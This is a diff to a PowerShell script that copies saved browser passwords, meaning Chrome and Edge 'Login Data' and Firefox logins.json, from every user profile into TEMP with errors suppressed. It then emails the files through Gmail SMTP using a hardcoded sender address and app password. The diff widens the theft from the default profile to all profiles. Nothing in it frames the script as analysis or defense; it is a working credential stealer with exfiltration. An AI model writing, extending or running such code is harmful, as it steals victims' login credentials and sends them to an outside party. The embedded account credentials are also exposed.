@@ -1,29 +1,52 @@
-# Copy browser login files if they exist
-$chromeSrc = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
-$chromeDst = "$env:TEMP\chrome_login_data.db"
-if (Test-Path $chromeSrc) {
-    Copy-Item $chromeSrc $chromeDst -ErrorAction SilentlyContinue -Force
-}
+# -- Copy Chrome Login Data from all profiles --
+$chromeUserData = "$env:LOCALAPPDATA\Google\Chrome\User Data"
+$chromeLoginFiles = @()
 
-$edgeSrc = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
-$edgeDst = "$env:TEMP\edge_login_data.db"
-if (Test-Path $edgeSrc) {
-    Copy-Item $edgeSrc $edgeDst -ErrorAction SilentlyContinue -Force
-}
-
-$firefoxProfileRoot = "$env:APPDATA\Mozilla\Firefox\Profiles"
-if (Test-Path $firefoxProfileRoot) {
-    $firefoxProfile = Get-ChildItem $firefoxProfileRoot | Where-Object { $_.PSIsContainer } | Select-Object -First 1
-    if ($firefoxProfile) {
-        $firefoxLoginsSrc = Join-Path $firefoxProfile.FullName "logins.json"
-        $firefoxLoginsDst = "$env:TEMP\firefox_logins.json"
-        if (Test-Path $firefoxLoginsSrc) {
-            Copy-Item $firefoxLoginsSrc $firefoxLoginsDst -ErrorAction SilentlyContinue -Force
+if (Test-Path $chromeUserData) {
+    $chromeProfiles = Get-ChildItem $chromeUserData -Directory | Where-Object { $_.Name -match 'Default|Profile \d+' }
+    foreach ($profile in $chromeProfiles) {
+        $loginDataPath = Join-Path $profile.FullName "Login Data"
+        if (Test-Path $loginDataPath) {
+            $destFile = "$env:TEMP\chrome_login_data_$($profile.Name).db"
+            Copy-Item $loginDataPath $destFile -ErrorAction SilentlyContinue -Force
+            $chromeLoginFiles += $destFile
         }
     }
 }
 
-# Email setup
+# -- Copy Edge Login Data from all profiles --
+$edgeUserData = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
+$edgeLoginFiles = @()
+
+if (Test-Path $edgeUserData) {
+    $edgeProfiles = Get-ChildItem $edgeUserData -Directory | Where-Object { $_.Name -match 'Default|Profile \d+' }
+    foreach ($profile in $edgeProfiles) {
+        $loginDataPath = Join-Path $profile.FullName "Login Data"
+        if (Test-Path $loginDataPath) {
+            $destFile = "$env:TEMP\edge_login_data_$($profile.Name).db"
+            Copy-Item $loginDataPath $destFile -ErrorAction SilentlyContinue -Force
+            $edgeLoginFiles += $destFile
+        }
+    }
+}
+
+# -- Copy Firefox logins.json from all profiles --
+$firefoxProfileRoot = "$env:APPDATA\Mozilla\Firefox\Profiles"
+$firefoxLoginFiles = @()
+
+if (Test-Path $firefoxProfileRoot) {
+    $firefoxProfiles = Get-ChildItem $firefoxProfileRoot -Directory
+    foreach ($profile in $firefoxProfiles) {
+        $loginsPath = Join-Path $profile.FullName "logins.json"
+        if (Test-Path $loginsPath) {
+            $destFile = "$env:TEMP\firefox_logins_$($profile.Name).json"
+            Copy-Item $loginsPath $destFile -ErrorAction SilentlyContinue -Force
+            $firefoxLoginFiles += $destFile
+        }
+    }
+}
+
+# -- Email setup --
 $smtpServer = "smtp.gmail.com"
 $smtpPort = 587
 $from = "zubaidyomar@gmail.com"
@@ -37,11 +60,14 @@ $password = "tgcwsfoamkossqej"
 $secpasswd = ConvertTo-SecureString $password -AsPlainText -Force
 $cred = New-Object System.Management.Automation.PSCredential ($username, $secpasswd)
 
-# Collect attachments
+# Collect all attachments
 $attachments = @()
-if (Test-Path $chromeDst) { $attachments += $chromeDst }
-if (Test-Path $edgeDst) { $attachments += $edgeDst }
-if ($firefoxLoginsDst -and (Test-Path $firefoxLoginsDst)) { $attachments += $firefoxLoginsDst }
+$attachments += $chromeLoginFiles
+$attachments += $edgeLoginFiles
+$attachments += $firefoxLoginFiles
+
+# Filter out any null or non-existent files just in case
+$attachments = $attachments | Where-Object { $_ -and (Test-Path $_) }
 
 # Send email with attachments
 Send-MailMessage -From $from -To $to -Subject $subject -Body $body -SmtpServer $smtpServer -Port $smtpPort -UseSsl -Credential $cred -Attachments $attachments
